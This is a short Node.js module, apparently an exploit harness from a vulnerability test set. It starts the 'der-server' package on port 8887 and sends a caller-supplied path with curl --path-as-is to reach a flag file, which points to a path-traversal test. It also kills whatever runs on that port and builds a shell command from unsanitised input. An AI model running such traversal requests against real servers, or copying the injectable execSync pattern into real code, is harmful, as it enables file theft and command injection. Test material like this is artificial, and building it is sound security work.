function exploitFunction(payload) {
    const path = require("path");
    const pathToFlag = path.resolve(__dirname, "../flag.html");
    const fs = require("fs");
    const { execSync } = require("child_process");

    try {
        execSync("fuser -k 8887/tcp", () => {});
    } catch (e) {}

    const pkg = require("der-server");
    pkg.start(__dirname, "../flag.html", 8887);

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8887${payload}"`;
    let output = execSync(attack_string, { encoding: 'utf-8' });

    return output;
}

module.exports = { exploitFunction };